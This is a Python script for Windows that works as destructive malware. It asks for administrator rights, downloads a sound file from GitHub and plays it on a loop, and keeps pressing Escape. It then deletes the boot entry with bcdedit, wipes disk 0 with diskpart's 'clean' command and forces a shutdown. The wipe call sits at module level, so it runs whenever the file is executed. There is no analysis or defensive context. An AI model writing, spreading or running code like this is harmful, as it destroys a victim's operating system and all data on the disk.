import subprocess
import ctypes
import sys
import os
import time
import winsound
import urllib.request
import pyautogui
import threading

NYAW_URL = "https://github.com/andyyepes2009-wq/skid-weapon/raw/refs/heads/main/Nyaw-Original-_-FNF-Kapi-Nyaw-Sound-Effect-DJ-D322MW%20(2).wav"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
def sound_spam():
    path = os.path.join(os.getenv('TEMP'), "kapi_nyaw.wav")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(NYAW_URL, path)
    except:
        pass
    while True:
        winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        time.sleep(0.1)

def escape_spam():
    while True:
        pyautogui.press('esc')
        time.sleep(0.1)

def ruin_everything():
    subprocess.run("bcdedit /delete {current} /f", shell=True)
    
    commands = "select disk 0\nclean\n"
    process = subprocess.Popen(['diskpart'], stdin=subprocess.PIPE, text=True)
    process.communicate(input=commands)
    
    os.system("shutdown /s /t 0")

def main():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return

    answer = ctypes.windll.user32.MessageBoxW(0, "Sorry twin your OS is gone", "NYAW", 0x24 | 0x40000)

threading.Thread(target=escape_spam, daemon=True).start()
threading.Thread(target=sound_spam, daemon=True).start()
    
time.sleep(10)
ruin_everything()

if __name__ == "__main__":
    main()